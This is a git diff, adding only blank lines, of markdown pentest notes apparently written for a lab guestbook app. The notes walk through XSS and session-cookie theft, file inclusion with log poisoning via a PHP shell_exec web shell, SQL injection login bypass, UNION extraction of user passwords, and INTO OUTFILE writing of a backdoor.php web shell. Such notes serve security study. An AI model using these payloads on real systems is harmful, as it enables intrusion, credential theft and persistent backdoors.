@@ -6,6 +6,7 @@
 2. Navigate to the host in your webbrowser (should be a guestbook application)
 
 ## XSS
+
 The sign in page isn't filtered and so you can submit javascript which will run when someone views your comment
 
 In this case I posted `<script>alert("XSS");</script>` which when viewed simply pops up the message "XSS"
@@ -31,6 +32,7 @@ XSS can be leveraged to do many things but as an example...
 4. We can steal this cookie and login as the user, edit cookies using your browsers console `document.cookie = "PHPSESSID=34015asdsad08f566d00635a6e8ae98"`
 
 ## Remote File Inclusions
+
 1. Whilst testing the website we notice that the language dropdown on the signin page appears to grab data from a file
 
 2. We can see this on examining the source code
@@ -63,9 +65,11 @@ XSS can be leveraged to do many things but as an example...
 
 
 **Notes**
+
 Might be turned off in php.ini file look for `allow_url_fopen` and `allow_url_include`
 
 ##Local File Inclusion
+
 Even with remote file includes turned off it's still possible to run local files and it may be possible to posion log files in order to run php of our choosing.
 
 1. Connect to the webserver using nc `nc -nv 10.11.5.115 80` and paste `<?php echo shell_exec($_GET['cmd']); ?>`
@@ -79,11 +83,13 @@ Even with remote file includes turned off it's still possible to run local files
 ##SQL Injection (SQLi)
 
 **Authentication Bypass**
+
 Fairly simply hack our goal is to change a query from `SELECT * FROM USERS WHERE username="admin" AND password="XXXX"` to `SELECT * FROM USERS WHERE username="admin" or 1=1;#" AND password="XXXX"`
 
 Once we gain control we can use limit's to ensure we only get one record if necessary
 
 **Error Based Enumeration**
+
 1. Test a field using `'` or `"` if you can see the errors you can glean extra information
 
 2. Using order by you can manipulate the SQL to let you know how many columns are in the table 
@@ -113,6 +119,7 @@ Once we gain control we can use limit's to ensure we only get one record if nece
     `http://10.11.5.115/comment.php?id=738%20UNION%20SELECT%201,2,name,4,password,6%20FROM%20users`
 
 ##Blind SQL Injection
+
 Used at times you can't find errors
 
 1. We confirm injection by first appending a true statement and then a false statement and seeing if we get different results
@@ -139,16 +146,19 @@ Used at times you can't find errors
 Using our union from before it's possible under certain circumstances to read files
 
 **Reading**
+
 ```
 10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
 ```
 
 **Writing**
+
 ```
 10.11.5.115/comment.php?id=738 UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']); ?>",6 INTO OUTFILE 'c:/xampp/htdocs/backdoor.php'
 ```
 
 ##SQL Map
+
 SQL map can be used to identify/exploit SQLi vulns
 
 Uses
